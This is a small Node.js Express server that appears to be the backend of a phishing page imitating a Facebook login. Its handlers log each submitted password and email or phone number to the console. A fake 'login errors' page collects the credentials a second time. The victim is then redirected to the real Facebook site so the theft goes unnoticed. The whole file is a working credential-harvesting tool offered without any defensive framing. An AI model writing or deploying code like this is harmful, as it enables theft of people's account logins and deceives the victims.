const express = require('express');
const path = require('path');
const app = express();


app.use(express.json())
app.use(express.urlencoded({extended: false}))

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Serve index.html on root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/', (req, res) => {
  // console.log(req.body);
  console.log(req.body.password);
  console.log(req.body.EmailOrPhonenumber);
  res.redirect('/login_errors')

  
});

app.get('/login_errors', (req, res)=>{
  res.sendFile(path.join(__dirname, 'public', 'LoginValidate.html'))
})
app.post('/login_errors', (req, res)=>{
  console.log('confirm',req.body.password);
  console.log('confirm',req.body.emailOrPhone);
  res.redirect('https://web.facebook.com/?_rdc=1&_rdr#')
})

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
